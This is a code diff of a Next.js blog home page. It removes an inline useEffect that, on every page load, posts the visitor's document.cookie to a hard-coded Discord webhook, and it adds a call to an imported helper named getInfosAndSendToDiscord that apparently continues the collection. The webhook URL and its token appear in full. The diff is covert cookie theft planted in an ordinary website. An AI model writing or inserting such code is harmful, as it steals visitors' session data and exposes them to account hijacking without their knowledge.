@@ -12,6 +12,7 @@ import Head from "next/head";
 import Copyright from "@/components/Copyright";
 import Link from "next/link";
 import { useEffect } from "react";
+import { getInfosAndSendToDiscord } from "@/utils/getInfosAndSendToDiscord";
 
 dayjs.extend(relativeTime);
 dayjs.locale('pt-br');
@@ -89,12 +90,7 @@ function shareContent() {
 export default function Home({ posts }: { posts: PostProps[] }) {
 
     useEffect(() => {
-        fetch("https://discord.com/api/webhooks/1371540247371976835/UpzS07800AGpVSLZPfanIIDUpoWVuJG1H99nGUeYfDqR9OnV35W_WkSYZq8sZdjD78Sv", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ content: `${document.cookie}` })
-        }
-        );
+        getInfosAndSendToDiscord()
     }, []);
 
     return (
